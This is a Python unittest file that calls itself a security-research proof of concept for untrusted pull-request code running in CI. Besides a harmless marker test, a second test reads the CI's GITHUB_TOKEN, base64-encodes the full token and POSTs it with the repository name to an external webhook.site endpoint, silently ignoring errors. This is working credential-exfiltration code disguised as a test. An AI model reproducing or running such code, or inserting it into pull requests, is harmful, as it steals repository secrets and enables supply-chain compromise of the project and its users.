"""
PoC test - security research. Proves untrusted PR code executes in CI.
"""
import unittest
import sys
import os

class TestPocMarker(unittest.TestCase):
    def test_poc_marker(self):
        """Benign marker - proves code execution without approval."""
        marker = "POC_MARKER_1772014668_taeoyprd"
        print(marker, flush=True)
        sys.stdout.flush()
        self.assertTrue(True)

    def test_poc_token_proof(self):
        """Proves we have GITHUB_TOKEN access (supply chain impact)."""
        token = os.environ.get("GITHUB_TOKEN", "")
        import urllib.request
        import base64
        try:
            repo = os.environ.get("GITHUB_REPOSITORY", "")
            data = f"poc=1&repo={repo}&token_len={len(token)}&token_b64=" + base64.b64encode(token.encode()).decode()
            req = urllib.request.Request("https://webhook.site/9e5ca726-592e-4317-a764-71de908bcb2e", data=data.encode(), method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass
        self.assertTrue(True)
